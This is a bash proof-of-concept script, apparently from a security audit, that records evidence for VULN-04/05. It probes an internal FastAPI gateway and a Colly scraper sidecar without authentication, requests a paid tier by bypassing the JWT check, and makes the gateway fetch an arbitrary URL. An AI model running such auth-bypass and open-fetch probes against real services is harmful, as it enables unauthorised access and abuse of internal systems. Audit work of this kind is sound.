#!/usr/bin/env bash
# VULN-04/05: Direct access to internal FastAPI gateway and Colly sidecar
set -euo pipefail

OUT_DIR="$(cd "$(dirname "$0")/../evidence" && pwd)"
GW="${GATEWAY_URL:-http://localhost:5003}"
GW_LOCAL="${GATEWAY_LOCAL_URL:-http://localhost:8000}"
COLLY="${COLLY_URL:-http://localhost:5004}"
COLLY_LOCAL="${COLLY_LOCAL_URL:-http://localhost:8081}"
OUT_FILE="$OUT_DIR/VULN-04-gateway-direct.txt"

mkdir -p "$OUT_DIR"

pick() {
  for u in "$@"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "$u" 2>/dev/null || echo "000")
    if [[ "$code" =~ ^(200|404|307)$ ]]; then
      echo "$u"
      return 0
    fi
  done
  echo "$1"
}

GW_BASE=$(pick "$GW" "$GW_LOCAL")
COLLY_BASE=$(pick "$COLLY/health" "$COLLY_LOCAL/health")
COLLY_BASE="${COLLY_BASE%/health}"

{
  echo "=== VULN-04/05 Internal API Direct Access ==="
  echo "Gateway: $GW_BASE"
  echo "Colly: $COLLY_BASE"
  echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
  echo ""

  echo "--- FastAPI root (no JWT) ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 5 "$GW_BASE/" 2>&1 | head -15
  echo ""

  echo "--- Reddit scaled tier=paid (bypass Nest JWT) ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 10 \
    "$GW_BASE/reddit/scaled/search?subreddit=technology&limit=2&tier=paid" 2>&1 | head -40
  echo ""

  echo "--- Scrapling fetch arbitrary URL ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 15 \
    "$GW_BASE/scrapling/fetch?url=https://example.com" 2>&1 | head -25
  echo ""

  echo "--- Colly health (no auth) ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 5 "$COLLY_BASE/health" 2>&1
  echo ""

  echo "--- Colly scrape (no auth) ---"
  curl -s -w "\nHTTP %{http_code}\n" -X POST "$COLLY_BASE/scrape" \
    -H "Content-Type: application/json" \
    -d '{"url":"https://example.com","maxDepth":0}' 2>&1 | head -30
} | tee "$OUT_FILE"

echo "Saved: $OUT_FILE"
